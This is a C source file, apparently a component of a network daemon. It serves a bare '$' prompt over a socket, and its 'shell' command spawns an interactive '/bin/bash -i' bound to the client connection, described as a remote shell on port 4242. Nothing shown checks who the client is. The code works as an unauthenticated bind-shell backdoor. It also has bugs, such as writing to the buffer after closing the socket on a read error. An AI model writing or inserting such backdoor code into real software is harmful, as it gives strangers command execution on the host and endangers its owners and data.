#include "shell.h"
#include <stdio.h>
#include <errno.h>

void little_shell(int fd, t_server *server)
{
	char buffer[4096];
	int ret;

	write(fd, "$ ", sizeof("$ "));
	bzero(buffer, sizeof(buffer));
	ret = read(fd, buffer, sizeof(buffer));
	if (ret <= 0)
	{
		// printf("read error little shell\n");
		if (errno != EAGAIN && errno != EWOULDBLOCK)
			return;
		server->current_client--;
		epoll_ctl(server->epollfd, EPOLL_CTL_DEL, fd, NULL);
		shutdown(fd, SHUT_RDWR);
		close(fd);
	}
	buffer[ret - 1] = '\0';
	if (strncmp(buffer, "?", 1) == 0)
	{
		write(fd, "?      show help\n" "shell  spawn a remote shell on 4242\n", sizeof("?      show help\n" "shell  spawn a remote shell on 4242\n"));
		little_shell(fd, server);
	}
	else if (strncmp(buffer, "shell", 5) == 0)
	{
		write(fd, "Spawning shell on port 4242\n", sizeof("Spawning shell on port 4242\n"));
		server->request_shell[fd] = true;
		close(fd);
		return;
	}
	else
	{
		// write(fd, "command not found. type ?\n", sizeof("command not found. type ?\n"));
		little_shell(fd, server);
	}
	write(fd, "$ ", sizeof("$ "));
}

void shell(int fd, t_server *server)
{
	pid_t parent_pid;
	pid_t child_pid;

	parent_pid = getpid();
	child_pid = fork();
	if (child_pid == 0)
	{
		dup2(fd, STDIN_FILENO);
		dup2(fd, STDOUT_FILENO);
		dup2(fd, STDERR_FILENO);
		chdir("/");
		execl("/bin/bash", "bash", "-i", NULL);
	}
	else
	{
		int pid = waitpid(child_pid, NULL, WNOHANG);
		server->request_shell[fd] = false;
		epoll_ctl(server->epollfd, EPOLL_CTL_DEL, fd, NULL);
		server->current_client--;
		close(fd);
	}
}